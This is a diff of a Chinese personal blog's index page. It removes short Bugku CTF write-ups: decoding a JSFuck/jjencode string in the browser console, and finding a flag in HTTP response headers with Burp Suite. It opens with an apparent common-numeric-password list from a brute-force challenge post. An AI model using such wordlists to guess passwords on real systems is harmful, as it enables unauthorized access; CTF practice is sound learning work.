r>588<br>600<br>666<br>598<br>668<br>678<br>688<br>888<br>988<br>999<br>1088<br>1100<br>1188<br>1234<br>1288<br>1388<br>1588<br>1688<br>1888<br>1949<br>1959<br>1960<br>1961<br>1962<br>1963<br>1964<br>1965<br>1966<br>1967<br>1968<br>1969<br>1970<br>1971<br>1972<br>1973<br>1974<br>1975<br>1976<br>1977<br>1978<br>1979<br>1980<br>1981<br>1982<br>1983<br>1984<br>1985<br>1986<br>1987<br>1988<br>1989<br>1990<br>1997<br>1999<br>2000<br>2001<br>2002<br>2088<br>2100<br>2188<br>2345<br>2588<br>3000<br>3721<br>3888<br>4567<br>4728<br>5555<br>5678<br>5888<br>6666<br>6688<br>6789<br>6888<br>7788<br>8888<br>8899<br>9988<br>9999<br>12345<br>23456<br>34567<br>45678<br>54321<br>88888<br>123456<br>654321<br>888888<br>6666<br>56789<br>1234567<br>12345678<br>123456789<br>1234567890<br>012345678<br>0123456789<br>01234567890<br>737<br>777<br>1111<br>2222<br>3333<br>4321</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">bugku</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/unln1999.github.io/2019/09/29/bk11-网站被黑/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-bk10-web5（jjencode）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/unln1999.github.io/2019/09/28/bk10-web5（jjencode）/">Bugku 2019/9/28 web5</a>
-    </h1>
-  
-
-        
-        <a href="/unln1999.github.io/2019/09/28/bk10-web5（jjencode）/" class="archive-article-date">
-  	<time datetime="2019-09-27T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="打开题目界面"><a href="#打开题目界面" class="headerlink" title="打开题目界面"></a>打开题目界面</h2><p>显示一段文字和一个文本框和提交按钮。</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>打开html代码，分区里有一堆字符，第一次看真的不知道是干啥的。<br>然后就是很正常的两个表单。<br>题目的意思是让你输入正确的flag，然后提交后会反馈给你是否正确。<br>我们先随便输点东西，看一下有没有错误反馈。<br>结果是有的，作者让你再看一下。<br>于是就研究html代码。<br>但是不知道那堆字符是干嘛的，于是去查了writeup。<br>提示中的JSPFUCK中的JSP是指java server page。这个好像也是一种加密，不太清楚到底是jjencode还是jspfuck。<br>总之，把这段字符放在控制行里，回车得到java代码。</p>
-<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>复制字符到浏览器console并回车。<br>得到flag，然后输入后发现不对。<br>再由题干中的字符大写启发，改为大写，则正确。</p>
-<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol>
-<li><strong>jsp加密</strong></li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">bugku</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/unln1999.github.io/2019/09/28/bk10-web5（jjencode）/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-bk9-头等舱" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/unln1999.github.io/2019/09/27/bk9-头等舱/">Bugku 2019/9/27 头等舱</a>
-    </h1>
-  
-
-        
-        <a href="/unln1999.github.io/2019/09/27/bk9-头等舱/" class="archive-article-date">
-  	<time datetime="2019-09-26T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="进入题目页面"><a href="#进入题目页面" class="headerlink" title="进入题目页面"></a>进入题目页面</h2><p>显示“什么都没有”</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>因为直接显示的内容里没有明显的线索。<br>因此看源代码。<br>发现也没有内容。<br>这时候再看更根本的HTTP响应。</p>
-<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>打开bp，把get请求发送到repeater里，然后go一下，接收返回来的http响应。<br>然后可以发现，响应头标里有flag。</p>
-<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol>
-<li><strong>HTTP响应头标</strong></li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">bugku</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/unln1999.github.io/2019/09/27/bk9-头等舱/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/unln1999.github.io/page/2/">&laquo; Prev</a><a class="page-number" href="/unln1999.github.io/">1</a><a class="page-number" href="/unln1999.github.io/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/unln1999.github.io/page/4/">4</a><a class="page-number" href="/unln1999.github.io/page/5/">5</a><a class="page-number" href="/unln1999.github.io/page/6/">6</a><a class="extend next" rel="next" href="/unln1999.github.io/page/4/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/unln1999.github.io/page/2/">&laquo; Prev</a><a class="page-number" href="/unln1999.github.io/">1</a><a class="page-number" href="/unln1999.github.io/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/unln1999.github.io/page/4/">4</a><a class="page-number" href="/unln1999.github.io/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/unln1999.github.io/page/7/">7</a><a class="extend next" rel="next" href="/unln1999.github.io/page/4/">Next &raquo;</a>
     </nav>
   
 
@@ -1085,11 +1322,11 @@ MathJax.Hub.Queue(function() {
     
     
       
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章（点击这个可以筛选标签）</a></li>
+      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">文章目录</a></li>
       
         
       
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">传送门</a></li>
+      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友链</a></li>
       
         
       
@@ -1114,11 +1351,11 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">web</a>
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+                <a href="javascript:void(0)" class="js-tag color4">web</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1138,19 +1375,19 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">大物</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">buuctf</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">模电</a>
+                <a href="javascript:void(0)" class="js-tag color3">大物</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">复变</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">模电</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1211,6 +1448,10 @@ MathJax.Hub.Queue(function() {
           
             <li class="search-li">
               <a href="https://ctf.bugku.com/challenges" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>BugKu题库</a>
+            </li>
+          
+            <li class="search-li">
+              <a href="https://moeyu.moe" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>夜樱·散花</a>
             </li>
           
         </ul>
